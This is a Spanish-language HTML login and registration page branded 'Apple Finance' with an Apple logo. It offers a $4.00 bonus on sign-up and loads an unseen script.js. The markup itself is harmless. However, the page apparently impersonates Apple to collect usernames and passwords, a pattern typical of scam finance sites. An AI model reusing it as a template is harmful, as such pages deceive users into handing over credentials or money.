<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Finance - Iniciar Sesión</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body class="login-page">

    <div class="login-box">
        <img src="apple-logo.png" class="apple-logo" alt="Apple">
        <h1>Iniciar sesión</h1>

        <form id="loginForm">
            <input type="text" id="phone" placeholder="Ingrese su usuario" required>
            
            <div class="password-wrapper">
                <input type="password" id="password" placeholder="Ingrese su contraseña" required>
                <span class="toggle-password" id="ojito"></span>
            </div>

            <button type="submit">Iniciar Sesión</button>
        </form>

        <button class="register-btn" id="openReg">Registrarse ahora</button>
        
        <p id="message"></p>
    </div>

    <div id="modalRegistro" class="overlay" style="display:none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); justify-content:center; align-items:center; z-index:999; backdrop-filter: blur(5px);">
        <div class="login-box" style="border: 1px solid #444;">
            <h2>Crear Cuenta</h2>
            <p style="font-size: 13px; color: #aaa; margin-bottom: 20px;">Recibe $4.00 de bono al instante</p>
            
            <form id="regForm">
                <input type="text" id="regUser" placeholder="Crea tu usuario" required>
                <input type="password" id="regPass" placeholder="Crea tu contraseña" required>
                
                <button type="submit" style="background: #28a745;">Finalizar Registro</button>
                <button type="button" id="closeReg" style="background: transparent; color: #ff4444; border: none; cursor: pointer; margin-top: 10px;">Volver al inicio</button>
            </form>
        </div>
    </div>

    <script type="module" src="script.js"></script>

</body>
</html>
